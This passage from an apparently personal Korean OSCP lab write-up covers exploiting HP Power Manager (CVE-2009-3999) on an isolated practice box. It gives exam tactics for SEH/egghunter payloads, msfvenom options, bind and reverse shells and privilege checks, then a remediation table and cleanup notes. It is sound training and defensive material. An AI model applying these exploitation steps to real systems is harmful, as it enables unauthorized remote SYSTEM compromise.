>    **`latin-1`이 핵심이다** — 0x00~0xFF를 1:1로 매핑하는 유일한 인코딩이라 바이트가 변형되지 않는다. `utf-8`을 쓰면 망가진다
>
> 이 항목은 **시험장에서 가장 자주 만나는 실무 문제**다. 공개 익스플로잇의 상당수가 python2다.

### ⑥ 시간 배분 복기

| 구간 | 소요 | 평가 |
|---|---|---|
| nmap 전수 스캔 | 111.97초 | 🟡 `--min-rate 5000`을 붙였으면 절반. [[Twiggy]]는 같은 전수 스캔이 53초였다 |
| 제품 식별 (`GoAhead` + `HP Power Manager`) | 즉시 | ✅ `-sC`의 `http-title`이 제품명을 바로 줬다 |
| 익스플로잇 검색 → PoC 확보 | 빠름 | ✅ 제품명이 완전히 특정되는 이름이라 검색이 쉬웠다 |
| 셸코드 생성 · 이식 | — | 🟡 명령에 결함 4건(①②③④). 결과적으로 통했지만 재현성이 없다 |
| 익스플로잇 실행 → SYSTEM | 30초 대기 포함 1회 성공 | ✅ |
| 권한상승 | 불필요 | ✅ |

**손절선**: 에그헌터 방식은 `time.sleep(30)`이 기본이고 저자가 60초까지 올리라고 적었다. **90초를 넘겨도 안 붙으면 대기 시간 문제가 아니다** — 그때는 ④(에그 소실)와 ③(badchar)을 먼저 의심한다. 익스플로잇을 세 번 던져서 안 되면 HP PM 서비스가 죽었을 가능성을 확인해야 한다 (`nmap -p80,3573` 재스캔). `EXITFUNC=thread`가 그걸 막아주지만, 실패한 시도가 프로세스를 죽였을 수 있다.

---

## 7. OSCP 시험 관점 — 이 상황을 다시 만나면 뭘 먼저 치는가

1. `-sV -sC`로 제품명을 얻는 것이 전부다. `80/tcp open http`만으로는 아무것도 못 한다. `Server: GoAhead-Webs` + `http-title: HP Power Manager`가 검색어를 완전히 특정했다. **버전 탐지를 생략한 스캔은 스캔이 아니다**
2. **`closed` vs `filtered`로 셸 방식을 정한다.** `closed ... (reset)` = 방화벽 없음 → bind 셸이 성립(리스너 관리가 없어 더 간단). `filtered` = 방화벽 있음 → reverse만, 그것도 443/53/80으로
3. **낡은 Windows 빌드는 서드파티 앱도 낡았다는 신호다.** `smb-os-discovery`가 `7600`(SP 미적용)을 알려주면 그 위의 모든 앱이 2009~2010년에 멈춰 있다고 가정하고 서드파티부터 판다
4. **`/goform/`을 보면 GoAhead = 임베디드 C 핸들러 = 메모리 손상 후보다.** `.asp` 확장자에 속아 IIS를 뒤지지 마라 — `Server:` 헤더가 진짜 근거다
5. **PoC를 열면 SEH형인지 고전형인지 먼저 판별한다.** 주소 앞 4바이트가 `\xeb\xXX\x90\x90`이면 SEH형이고 가젯은 `pop/pop/ret`이다. 이 지문 하나로 구조 전체가 읽힌다
6. **리턴 주소의 출처(주석)를 확인한다.** 애플리케이션 자기 자신이나 번들 DLL이면 → OS가 달라도 될 확률이 높다(이 박스). `kernel32`/`ntdll`이면 → OS·SP가 정확히 맞아야 한다
7. **`EXITFUNC=thread`를 쓴다.** `process`면 취약 서비스가 죽어 재시도가 불가능해진다. 시험에서 한 번의 실수로 박스를 리버트하게 되는 전형적 원인이다
8. **msfvenom 명령은 PoC 주석에서 복사하지 말고 직접 조립한다.** badchar 정본은 Metasploit 모듈의 `BadChars` — `/usr/share/metasploit-framework/modules/exploits/` 아래 `.rb` 파일을 직접 열어 본다. **모듈을 실행하는 것과 읽는 것은 다르다. 읽는 것은 카드를 소모하지 않는다**
9. **`-e`를 항상 명시한다.** 안 주면 msfvenom이 자동 선택하고, 그 사실이 출력의 `Found N compatible encoders` / `chosen`에만 드러난다. `-b`만 주고 인코더를 안 주는 것은 "알아서 해줘"라는 뜻이다
10. **`-v <이름>`으로 변수명을 지정한다.** 기본 `buf`는 PoC의 변수와 충돌하기 쉽고, msfvenom 출력 첫 줄이 대입문이라 앞의 값(여기서는 egg)을 지워버린다. **이 실패는 아무 메시지도 안 낸다**
11. **bind인지 reverse인지 방향을 명확히 한다.** bind = 타겟이 `LPORT`를 연다, 공격자가 `nc <타겟> <LPORT>`로 접속, LHOST 없음. reverse = 공격자가 먼저 `nc -lvnp`, LHOST 필수
12. **⚠️ Metasploit 제약 — 이 박스는 카드를 아꼈다.** OffSec 공식 시험 가이드는 Metasploit 모듈(Auxiliary/Exploit/Post)과 Meterpreter를 단 1대에만 허용하고, **`check`를 쓰는 것만으로도 그 카드가 소모된다.** 반면 `msfvenom`과 `exploit/multi/handler`는 모든 타겟에 허용된다.
    → **정석은 이 박스처럼 "모듈은 읽기만 하고, 공개 PoC + msfvenom으로 푸는 것"**이다. `hp_power_manager_filename` 모듈을 실행했다면 귀중한 카드 한 장을 Fundamental 박스에 낭비했을 것이다
13. **python2 PoC를 만나면 세 곳만 고치면 py3가 된다** — `print()` 괄호 · `urllib.parse.quote_plus` · 모든 페이로드를 `bytes`로 만들고 `.encode('latin-1')`. `latin-1`이 핵심이다(0x00~0xFF 1:1 매핑). `utf-8`을 쓰면 0x80 이상이 2바이트로 늘어나 페이로드가 조용히 망가진다
14. **셸을 잡으면 `whoami`가 1번 명령이다.** SYSTEM이면 열거를 통째로 건너뛴다. 아니면 `whoami /priv` → `SeImpersonatePrivilege` → Win7/2008R2 구형이면 JuicyPotato가 아직 살아 있다(빌드 17763 이상에서 죽은 것과 대비)
15. **`nc` 원시 셸에서는 Ctrl+C가 셸을 죽인다.** `dir /s`·`Get-ChildItem -Recurse` 같은 오래 걸리는 명령을 피하고, `where /r`·`dir /s /b`로 대체한다. Kali 쪽에서 `rlwrap nc`로 붙으면 히스토리·행 편집을 얻는다
16. **증거는 `whoami & hostname & ipconfig & type <flag>`를 한 화면에.** `cmd`의 순차 실행 구분자는 `&`다(`;` 아님). `ip a`가 아니라 `ipconfig`

---

## 8. 방어 관점

| 결함 | 조치 |
|---|---|
| HP Power Manager 4.2.10 미만 방치 (CVE-2009-3999) | 4.2.10 이상으로 업그레이드. 벤더 게시판 HPSBMA02485/SSRT090252가 2010-01-19에 수정본을 냈다. 16년 묵은 pre-auth RCE(CVSS 10.0)가 남아 있는 것이 이 박스의 근본 원인이다 |
| 제품이 단종되어 패치가 없다면 | 격리하거나 제거한다. UPS 관리 콘솔은 인터넷·일반 사용자망에 있을 이유가 없다 — 관리 VLAN 안에서만 접근 가능하게 |
| 관리 웹 UI가 인증 없이 노출 | `Au:N`이 이 CVE의 핵심이다. 최소한 리버스 프록시 앞단에 HTTP Basic 인증 + IP 제한을 두면 pre-auth 익스플로잇이 닿지 못한다 |
| `DevManBE.exe`가 SYSTEM으로 실행 | 서비스를 전용 저권한 계정으로 돌린다. 오버플로우가 성공해도 SYSTEM이 아니라 그 계정 권한에 그친다 — 최소권한이 피해 범위를 결정한다 |
| Windows 7 빌드 7600 (SP 미적용) | SP1 + 누적 업데이트 적용. 근본적으로는 2020년 지원 종료된 OS를 운영에서 제거한다. Win7 7600은 커널 익스플로잇도 그대로 산다 |
| 바이너리에 ASLR(`/DYNAMICBASE`) 미적용 `[가정]` | 재빌드가 가능하면 `/DYNAMICBASE /NXCOMPAT /GS /SAFESEH`. 불가능하면 EMET/Windows Defender Exploit Guard로 프로세스 단위 강제 ASLR·SEHOP 적용 — 하드코딩 리턴 주소가 무력화된다 |
| SafeSEH·SEHOP 미적용 | SEH 오버플로우 계열 전체를 막는다. Exploit Guard의 프로세스 완화 설정으로 소스 없이도 켤 수 있다 |
| SMB `message_signing: disabled` | 서명 필수화(`RequireSecuritySignature=1`). 단독 호스트라 릴레이 위험은 낮지만 도메인에 가입되는 순간 즉시 위험해진다 |
| 3389 RDP가 외부 노출 | NLA 강제 + 관리 네트워크 제한. 게이트웨이(RD Gateway/VPN) 경유로만 |
| 익스플로잇 시도 탐지 없음 | GoAhead 접근 로그에서 비정상적으로 긴 `fileName` 파라미터를 경보(예: 200자 초과). WAF가 있으면 `/goform/formExportDataLogs`에 길이 제한 규칙 |

---

## 9. 참고 자료

- **CVE-2009-3999** — HP Power Manager `goform/formExportDataLogs` `fileName` 스택 오버플로우 (CVSSv2 10.0, pre-auth): https://nvd.nist.gov/vuln/detail/CVE-2009-3999
- **CVE-2009-4000** — 같은 엔드포인트·같은 파라미터의 디렉터리 트래버설 (혼동 주의): https://nvd.nist.gov/vuln/detail/CVE-2009-4000
- **CVE-2009-2685** — HP PM 로그인 폼의 `Login` 변수 오버플로우. **이 박스와 무관**: https://nvd.nist.gov/vuln/detail/CVE-2009-2685
- **HP 벤더 게시판 HPSBMA02485 / SSRT090252** (2010-01-19, 수정 버전 4.2.10): http://marc.info/?l=bugtraq&m=126393370331959&w=2
- **Secunia Research SA-2009-47** (발견자 Alin Rad Pop, 원인 기술): https://web.archive.org/web/2016/http://secunia.com/secunia_research/2009-47/
- **Metasploit 모듈 원문** `exploit/windows/http/hp_power_manager_filename` — `Targets`·`BadChars`·`exploit()` 전문: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/hp_power_manager_filename.rb
- 사용한 PoC (python2, bind shell): https://github.com/Muhammd/HP-Power-Manager
- **python3 포크** (reverse shell, Win7 7600에서 테스트됨): https://github.com/CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3
- Exploit-DB 18015: https://www.exploit-db.com/exploits/18015
- `x86/call4_dword_xor` 인코더 원문 (디코더 스텁 대조용): https://github.com/rapid7/metasploit-framework/blob/master/modules/encoders/x86/call4_dword_xor.rb
- `Rex::Text.dehex` (`-b` 파싱 규칙, `\x5` 판정 근거): https://github.com/rapid7/rex-text/blob/master/lib/rex/text/hex.rb
- **OSCP+ Exam Guide** — Metasploit 1대 한정 / `msfvenom`·`multi/handler` 전 타겟 허용: https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide
- GoAhead WebServer (`websFormDefine` → `/goform/` 라우팅): https://github.com/embedthis/goahead
- skape, "Safely Searching Process Virtual Address Space" — `int 0x2e` 에그헌터 원 논문

## 남긴 흔적 (랩 정리용)

- **타겟 파일시스템 변조 없음** — 셸코드는 메모리에서만 실행됐고 파일을 남기지 않았다
- `DevManBE.exe` 프로세스 상태 — `EXITFUNC=thread`로 생성했으므로 셸 종료 시 스레드만 죽고 서비스는 살아 있다. **다만 오버플로우로 예외를 발생시켰으므로 프로세스가 불안정할 수 있다** — 랩 반납 전 리버트 권장
- 열린 포트 — 셸코드가 타겟에 1234/tcp 바인드 리스너를 열었다. 세션 종료 후에도 스레드가 남아 있으면 **인증 없는 SYSTEM 셸이 그대로 노출된다.** 실전이라면 반드시 정리 확인이 필요한 항목
- 획득 자격증명: 없음 (자격증명 없이 메모리 손상으로 직접 SYSTEM)
- 공격자 VPN IP: `192.168.49.60` · 타겟: `192.168.60.45`

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[Osaka]] — 같은 계열의 스택 오버플로우. 거기서는 **포맷 스트링으로 ASLR을 깨고 ROP로 DEP를 우회**하는 한 단계 위 난이도였다. 셸코드를 눈으로 검증하는 규율도 그 노트에서 왔다
- [[Twiggy]] — `filtered` 방화벽 때문에 리버스셸이 실패한 반대 사례. `closed` vs `filtered`가 셸 방식을 정한다
- [[Squid]] — 셸을 잡았을 때 SYSTEM이 **아니었던** 경우(`LOCAL SERVICE` → FullPowers → PrintSpoofer). `whoami` 한 줄이 갈림길이다
- [[Twiggy]] · [[Squid]] · [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]] — 누적 패턴 **"응답이 성공을 뜻하지 않는다"** / "조용한 실패가 가장 비싸다"
- [[Hub]] · [[Levram]] · [[RubyDome]] · [[Squid]] · [[Twiggy]] — 누적 패턴 "버전 판정은 독립 근거 2개". 여기서는 `smb-os-discovery` + `rdp-ntlm-info`였다
- [[Jacko]] · [[Slort]] · [[Access]] — msfvenom 페이로드를 쓴 다른 Windows 박스
- [[_STATUS]] — PG 283개 전수 진행현황
